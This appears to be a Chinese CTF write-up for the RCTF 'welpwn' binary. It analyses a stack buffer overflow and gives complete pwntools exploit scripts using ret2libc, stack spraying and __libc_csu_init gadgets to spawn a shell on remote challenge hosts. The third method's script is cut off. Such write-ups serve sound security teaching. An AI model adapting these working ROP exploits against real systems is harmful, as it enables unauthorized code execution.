id="0x00-检查程序开启的保护机制-1"><a href="#0x00-检查程序开启的保护机制-1" class="headerlink" title="0x00 检查程序开启的保护机制"></a>0x00 检查程序开启的保护机制</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ file welpwn        </span><br><span class="line">welpwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=a48a707a640bf53d6533992e6d8cd9f6da87f258, not stripped</span><br><span class="line"></span><br><span class="line">$ checksec welpwn</span><br><span class="line">[*] &apos;/home//Desktop/remote-dbg/welpwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;我们可以看到这是一个<code>64位</code>的<code>ELF可执行程序</code>，开启了<code>Partial RELRO</code>(部分重定位只读)，在这种情况下，<code>.dynamic段</code>是不可写的，<code>.got.plt段</code>(GOT表)是可写的。又开启了<code>NX(DEP)</code>使堆栈上的代码不可执行。</p><h3 id="0x10-静态分析-1"><a href="#0x10-静态分析-1" class="headerlink" title="0x10 静态分析"></a>0x10 静态分析</h3><p>&emsp;&emsp;通过IDA插件反编译后，<code>主函数</code>的伪代码如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> argv, <span class="keyword">const</span> <span class="keyword">char</span> envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">400</span>]; <span class="comment">// [rsp+0h] [rbp-400h]</span></span><br><span class="line"></span><br><span class="line">  alarm(<span class="number">10u</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Welcome to RCTF\n"</span>, <span class="number">16u</span>LL);</span><br><span class="line">  fflush(_bss_start);                      <span class="comment">// 刷新bss段内容</span></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">1024u</span>LL);</span><br><span class="line">  echo(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;我们可以看到<code>主函数</code>在<code>栈</code>上有一个<code>1024字节</code>的大缓冲区buf，在从标准输入读取完数据后，将<code>buf缓冲区地址</code>作为参数，传入到了<code>echo()函数</code>。下面是echo()函数的伪代码：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">echo</span><span class="params">(<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> flag[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; buf[i]; ++i )</span><br><span class="line">    flag[i] = buf[i];     <span class="comment">// flag大小为16,存在栈溢出</span></span><br><span class="line">  flag[i] = <span class="number">0</span>;  <span class="comment">// 如果buf中的字符串长度为16,这里可以修改rbp最低字节</span></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">"ROIS"</span>, flag) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"RCTF&#123;Welcome&#125;"</span>, flag);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">" is not flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"%s"</span>, flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;我们可以看到<code>flag字符数组</code>只有<code>16字节</code>大小，如果传入的<code>buf字符串</code>的长度大于16字节，就会覆盖<code>echo()函数</code>的<code>rbp内容</code>(也就是main函数的rbp)，以及<code>echo()函数</code>的<code>返回地址</code>，从而获得程序的控制流。</p><h3 id="0x20-方法一：如果提供了libc-so，栈喷射-覆盖main’s-rbp最低字节，转移main函数rbp到rop代码处。ret2libc。"><a href="#0x20-方法一：如果提供了libc-so，栈喷射-覆盖main’s-rbp最低字节，转移main函数rbp到rop代码处。ret2libc。" class="headerlink" title="0x20 方法一：如果提供了libc.so，栈喷射+覆盖main’s rbp最低字节，转移main函数rbp到rop代码处。ret2libc。"></a>0x20 方法一：如果提供了libc.so，栈喷射+覆盖main’s rbp最低字节，转移main函数rbp到rop代码处。ret2libc。</h3><p><strong><code>利用思路</code></strong>：</p><p>1、首先构造<code>payload</code>，使echo()函数的rbp指向的内容的最低字节修改为<code>“\x00”</code>，也就是<code>main()函数</code>的<code>rbp</code>的<code>最低字节</code>。echo()函数正常返回到main()函数，但是main()函数的rbp得到修改，这样就会使<code>main()函数</code>返回时，<code>返回地址</code>落在了<code>buf缓冲区内</code>。我们通过将<code>ROP chain</code>喷射到<code>buf缓冲区内</code>，使main()函数返回时刚好可以<code>返回到ROP chain</code>。但这需要一定的几率，因为系统如果开启<code>ASLR</code>，每次执行程序时，<code>main()函数的rbp</code>都是不同的。</p><p>&emsp;&emsp;此<code>ROP chain</code>的功能是利用<code>puts()函数</code>泄露任一程序中使用到的<code>库函数地址</code>。然后，返回到<code>main()函数</code>起始地址，进行<code>下一次利用</code>。</p><p>2、根据泄露出的<code>库函数地址</code>，以及所给<code>libc.so</code>，我们可以计算出<code>libc.so的加载基址</code>。再加上system()函数的偏移或“/bin/sh\x00”字符串的偏移，就可以计算出<code>system()函数</code>的地址以及<code>“/bin/sh\x00”</code>字符串的地址。</p><p>3、再次构造<code>payload</code>，这次的<code>ROP chain</code>的功能是调用<code>system(&quot;/bin/sh&quot;)</code>函数。</p><p><strong><code>完整exp</code></strong>：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># libc版本: libc6_2.23-0ubuntu11.2_amd64</span></span><br><span class="line"><span class="comment"># 方法：栈喷射+覆盖main's rbp最低字节,转移main函数栈底位置。</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.binary = <span class="string">'./welpwn'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'amd64'</span>,<span class="string">'bits'</span>:<span class="string">'64'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./welpwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23_x86_64.so'</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x4008a3</span></span><br><span class="line">main_addr = <span class="number">0x4007CD</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">bp 0x4007CD,main函数起始地址</span></span><br><span class="line"><span class="string">bp 0x400819,read()函数调用地址</span></span><br><span class="line"><span class="string">bp 0x400782,flag[i] = 0;地址,修改rbp最低字节</span></span><br><span class="line"><span class="string">bp 0x400793,strcmp()函数调用地址</span></span><br><span class="line"><span class="string">bp 0x4007C6,return printf("%s", flag);</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'remote'</span>]:</span><br><span class="line">        io = remote(<span class="string">'180.76.128.48'</span>,<span class="number">6666</span>) </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            io = gdb.debug(<span class="string">'./welpwn'</span>,<span class="string">'''</span></span><br><span class="line"><span class="string">                                        bp 0x4007CD</span></span><br><span class="line"><span class="string">                                        bp 0x400819</span></span><br><span class="line"><span class="string">                                        bp 0x400782</span></span><br><span class="line"><span class="string">                                        bp 0x400793</span></span><br><span class="line"><span class="string">                                        bp 0x4007C6'''</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io = process(<span class="string">'./welpwn'</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(io)</span>:</span></span><br><span class="line">    payload = <span class="string">'A'</span>*<span class="number">0x10</span> + <span class="string">'\x00'</span>*<span class="number">8</span> <span class="comment"># \x00截断</span></span><br><span class="line">    rop = p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">    <span class="keyword">while</span> len(payload) &lt; <span class="number">1024</span> - len(rop):</span><br><span class="line">        payload += rop</span><br><span class="line">    payload = payload.ljust(<span class="number">1024</span>,<span class="string">'B'</span>)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">'Welcome to RCTF\n'</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.recvuntil(<span class="string">'A'</span>*<span class="number">0x10</span>) <span class="comment"># printf("%s", flag);</span></span><br><span class="line">    data = io.recvuntil(<span class="string">'\n'</span>).strip(<span class="string">'\n'</span>) <span class="comment"># rop中调用puts函数打印puts函数地址</span></span><br><span class="line">    puts_addr = u64(data.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"puts_addr:"</span>,hex(puts_addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> puts_addr&amp;<span class="number">0xfff</span> != <span class="number">0x6A0</span>: <span class="comment"># 系统ASLR开启,不能保证每次main函数的rbp都符合条件</span></span><br><span class="line">        exit(<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">    libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]<span class="comment"># 0x6F6A0</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"libc_base:"</span>,hex(libc_base)</span><br><span class="line">    system_addr = libc_base + libc.sym[<span class="string">'system'</span>]<span class="comment"># 0x453A0</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"system_addr:"</span>,hex(system_addr)</span><br><span class="line">    binsh_addr = libc_base + <span class="number">0x18CE17</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"binsh_addr:"</span>,hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># \x00截断,main函数的rbp,之前的与现在的相差0x10,覆盖完rbp后,无法返回到rop代码,所以'B'*0x10用于调整rop位置</span></span><br><span class="line">    payload2 = <span class="string">'A'</span>*<span class="number">0x10</span> + <span class="string">'\x00'</span>*<span class="number">8</span> + <span class="string">'B'</span>*<span class="number">0x10</span> </span><br><span class="line">    rop = p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(main_addr)</span><br><span class="line">    <span class="keyword">while</span> len(payload2) &lt; <span class="number">1024</span>:</span><br><span class="line">        payload2 += rop</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">'Welcome to RCTF\n'</span>)</span><br><span class="line">    <span class="comment"># 如果是send(),缓冲区中会有超过1024字节的那部分数据,没有换行符,会与输入的命令进行拼接</span></span><br><span class="line">    io.sendline(payload2) </span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    debug = <span class="number">0</span><span class="comment"># debug = 1表示进行调试</span></span><br><span class="line">    io = get_io()</span><br><span class="line">    pwn(io)</span><br></pre></td></tr></table></figure></p><h3 id="0x30-方法二：如果提供了libc-so，使用-libc-csu-init中的通用gadgets构造ROP-chain。ret2libc。"><a href="#0x30-方法二：如果提供了libc-so，使用-libc-csu-init中的通用gadgets构造ROP-chain。ret2libc。" class="headerlink" title="0x30 方法二：如果提供了libc.so，使用__libc_csu_init中的通用gadgets构造ROP chain。ret2libc。"></a>0x30 方法二：如果提供了libc.so，使用__libc_csu_init中的通用gadgets构造ROP chain。ret2libc。</h3><p><strong><code>利用思路</code></strong>：</p><p>1、构造<code>payload</code>，使其可以覆盖<code>echo()函数</code>的<code>返回地址</code>，返回到构造的<code>ROP chain</code>地址处。ROP chain主要是使用<code>__libc_csu_init</code>中的<code>通用gadgets</code>构造。执行完ROP chain，使程序返回<code>main()函数</code>起始地址，进行<code>下一次利用</code>。</p><p>2、利用分为<code>三个阶段</code>。</p><blockquote><p><code>第一阶段</code>：调用write()函数，<code>泄露</code>程序中使用到的任意<code>库函数的地址</code>。然后根据泄露出的库函数地址，以及所给libc.so，我们可以计算出libc.so的加载基址。再加上system()函数的偏移或“/bin/sh\x00”字符串的偏移，就可以计算出system()函数的地址以及“/bin/sh\x00”字符串的地址。<br><code>第二阶段</code>：调用read()函数，将计算出的<code>system()</code>函数地址以及<code>“/bin/sh\x00”</code>字符串地址，写到<code>.bss段</code>，以方便下次构造ROP chain。<br><code>第三阶段</code>：调用system(“/bin/sh”)获取shell。</p></blockquote><p><strong><code>完整exp</code></strong>：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># libc版本: libc6_2.23-0ubuntu11.2_amd64</span></span><br><span class="line"><span class="comment"># 方法：使用__libc_csu_init中的通用gadgets构造ROP</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.binary = <span class="string">'./welpwn'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'amd64'</span>,<span class="string">'bits'</span>:<span class="string">'64'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./welpwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23_x86_64.so'</span>)</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main_addr = <span class="number">0x4007cd</span></span><br><span class="line">bss_addr = <span class="number">0x601270</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008a3</span> <span class="comment"># pop rdi;ret</span></span><br><span class="line">pop4_r12_ret = <span class="number">0x40089c</span> <span class="comment"># pop r12 r13 r14 r15;ret</span></span><br><span class="line">pop6_rbx_ret = <span class="number">0x40089a</span> <span class="comment"># pop rbx rbp r12 r13 r14 r15;ret</span></span><br><span class="line"><span class="comment"># __libc_csu_init中的通用gadgets</span></span><br><span class="line"><span class="comment"># mov   rdx, r13 ;</span></span><br><span class="line"><span class="comment"># mov   rsi, r14 ;</span></span><br><span class="line"><span class="comment"># mov   edi, r15d ;</span></span><br><span class="line"><span class="comment"># call  qword ptr [r12+rbx*8] ;</span></span><br><span class="line">mov_rdx_rsi_edi_call = <span class="number">0x400880</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">bp 0x4007CD,main函数起始地址</span></span><br><span class="line"><span class="string">bp 0x400819,read()函数调用地址</span></span><br><span class="line"><span class="string">bp 0x400782,flag[i] = 0;地址,修改rbp最低字节</span></span><br><span class="line"><span class="string">bp 0x400793,strcmp()函数调用地址</span></span><br><span class="line"><span class="string">bp 0x4007C6,return printf("%s", flag);</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'remote'</span>]:</span><br><span class="line">        io = remote(<span class="string">'111.198.29.45'</span>,<span class="number">53830</span>) </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            io = gdb.debug(<span class="string">'./welpwn'</span>,<span class="string">'''</span></span><br><span class="line"><span class="string">                                        bp 0x4007CD</span></span><br><span class="line"><span class="string">                                        bp 0x400819</span></span><br><span class="line"><span class="string">                                        bp 0x400782</span></span><br><span class="line"><span class="string">                                        bp 0x400793</span></span><br><span class="line"><span class="string">                                        bp 0x4007C6'''</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io = process(<span class="string">'./welpwn'</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(io)</span>:</span></span><br><span class="line">    <span class="comment"># echo()中的flag缓冲区,0x10字节。echo()返回地址下面就是main函数中大小为1024字节的缓冲区</span></span><br><span class="line">    <span class="comment"># flag[16],rbp,ret_addr</span></span><br><span class="line">    <span class="comment"># r12 = 'A'*8,r13 = 'A'*8,r14 = 'A'*8,r15 = pop4_r12_ret,ret_addr = pop6_rbx_ret</span></span><br><span class="line">    payload = <span class="number">0x18</span>*<span class="string">"A"</span> + p64(pop4_r12_ret)  </span><br><span class="line">    payload += p64(pop6_rbx_ret)</span><br><span class="line">    <span class="comment"># rbx = 0,rbp = 1,r12 = write_got,r13 = 8,r14 = write_got,r15 = 1</span></span><br><span class="line">    payload += p64(<span class="number">0x0</span>) + p64(<span class="number">0x1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>)  </span><br><span class="line">    <span class="comment"># mov   rdx, r13 ; rdx = r13 = 8</span></span><br><span class="line">    <span class="comment"># mov   rsi, r14 ; rsi = r14 = write_got</span></span><br><span class="line">    <span class="comment"># mov   edi, r15d ; edi = r15d = 1</span></span><br><span class="line">    <span class="comment"># call  qword ptr [r12+rbx*8] ; [r12+rbx*8] = [write_got]</span></span><br><span class="line">    payload += p64(mov_rdx_rsi_edi_call) <span class="comment"># write(1,write_got,8)</span></span><br><span class="line">    <span class="comment"># add rsp,8;pop rbx;pop rbp;pop r12;pop r13;pop r14;pop r15;ret(7*8 = 56)</span></span><br><span class="line">    payload += <span class="string">'\x00'</span>*<span class="number">56</span></span><br><span class="line">    payload += p64(main_addr)</span><br><span class="line">    io.recvuntil(<span class="string">"Welcome to RCTF\n"</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">    write_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"write_addr:"</span>,hex(write_addr)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"write_offset:"</span>,hex(libc.sym[<span class="string">'write'</span>])</span><br><span class="line">    libc_base_addr = write_addr - libc.sym[<span class="string">'write'</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"libc_base_addr:"</span>,hex(libc_base_addr)</span><br><span class="line">    system_addr = libc_base_addr + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"system_addr:"</span>,hex(system_addr)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"system_offset:"</span>,hex(libc.sym[<span class="string">'system'</span>])</span><br><span class="line"></span><br><span class="line">    payload2 = <span class="string">"A"</span>*<span class="number">0x18</span> + p64(pop4_r12_ret) </span><br><span class="line">    payload2 += p64(pop6_rbx_ret) </span><br><span class="line">    payload2 += p64(<span class="number">0x0</span>) + p64(<span class="number">0x1</span>) + p64(read_got) + p64(<span class="number">0x11</span>) + p64(bss_addr) + p64(<span class="number">0</span>) </span><br><span class="line">    payload2 += p64(mov_rdx_rsi_edi_call) <span class="comment"># read(0,bss_addr,0x11)</span></span><br><span class="line">    payload2 += <span class="string">"\x00"</span>*<span class="number">56</span></span><br><span class="line">    payload2 += p64(main_addr)</span><br><span class="line">    io.recvuntil(<span class="string">"Welcome to RCTF\n"</span>)</span><br><span class="line">    io.sendline(payload2)</span><br><span class="line">    io.sendline(<span class="string">"/bin/sh\x00"</span>+ p64(system_addr))</span><br><span class="line"></span><br><span class="line">    payload3 = <span class="string">"A"</span>*<span class="number">0x18</span> + p64(pop4_r12_ret)</span><br><span class="line">    payload3 += p64(pop6_rbx_ret) </span><br><span class="line">    payload3 += p64(<span class="number">0x0</span>) + p64(<span class="number">0x1</span>) + p64(bss_addr+<span class="number">8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(bss_addr) </span><br><span class="line">    payload3 += p64(mov_rdx_rsi_edi_call) <span class="comment"># system("/bin/sh")</span></span><br><span class="line">    payload3 += <span class="string">"\x00"</span>*<span class="number">56</span></span><br><span class="line">    payload3 += p64(main_addr)</span><br><span class="line">    io.recvuntil(<span class="string">"Welcome to RCTF\n"</span>)</span><br><span class="line">    io.sendline(payload3)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">"__main__"</span>:</span><br><span class="line">    debug = <span class="number">0</span>  <span class="comment"># debug = 1表示进行调试</span></span><br><span class="line">    io = get_io()</span><br><span class="line">    pwn(io)</span><br></pre></td></tr></table></figure></p><h3 id="0x40-方法三：如果未提供libc-so，使用pwntools的DynELF模块对库函数地址进行泄露。ret2libc。"><a href="#0x40-方法三：如果未提供libc-so，使用pwntools的DynELF模块对库函数地址进行泄露。ret2libc。" class="headerlink" title="0x40 方法三：如果未提供libc.so，使用pwntools的DynELF模块对库函数地址进行泄露。ret2libc。"></a>0x40 方法三：如果未提供libc.so，使用pwntools的DynELF模块对库函数地址进行泄露。ret2libc。</h3><p>&emsp;&emsp;使用此方法，编写exp时就比较简单了，因为很多工作都被<code>pwntools</code>封装好了，我们只需要<code>调用一下</code>就可以了。但是，不知道原理怎么行，所以，我决定重新写一篇文章进行<code>DynELF泄露原理</code>的介绍。</p><p>&emsp;&emsp;<code>DynELF</code>是<code>pwntools</code>中专门用来应对<code>没有libc情况</code>的漏洞利用模块，在提供一个<code>目标程序任意地址</code>的情况下，我们需要<code>实现一个函数</code>，此函数可以泄露<code>任意地址</code>的<code>任意数据</code>，现在则可以解析<code>任意加载库</code>的<code>任意符号地址</code>。</p><p><strong><code>模板</code>*</strong>：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p = remote(ip, port)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    data = p.read(address, <span class="number">4</span>)</span><br><span class="line">    log.debug(<span class="string">"%#x =&gt; %s"</span> % (address, enhex(data <span class="keyword">or</span> <span class="string">''</span>)))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"> </span><br><span class="line">d = DynELF(leak, pointer = pointer_into_ELF_file, elf = ELFObject)</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line">read_add = d.lookup(<span class="string">'read'</span>,<span class="string">'libc'</span>)</span><br></pre></td></tr></table></figure></p><p><strong><code>利用思路</code></strong>：</p><p>1、编写<code>任意地址</code>泄露<code>任意数据</code>函数。此函数中的payload的<code>ROP chain</code>，我们使用<code>__libc_csu_init</code>中的<code>通用gadgets</code>构造，通过调用<code>write()</code>函数，泄露<code>任意地址</code>的<code>8字节数据</code>。</p><p>2、通过<code>DynELF</code>中泄露符号地址的函数<code>lookup</code>，泄露<code>system()</code>函数地址和<code>gets()</code>函数地址。</p><p>3、待找到<code>libc</code>中<code>system()</code>函数地址和<code>gets()</code>函数地址，再构造<code>payload</code>，调用<code>gets()</code>函数，将<code>“/bin/sh”</code>写入到<code>“.bss”段</code>，再调用<code>system()</code>函数，获取shell。</p><p><strong><code>完整exp</code></strong>：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 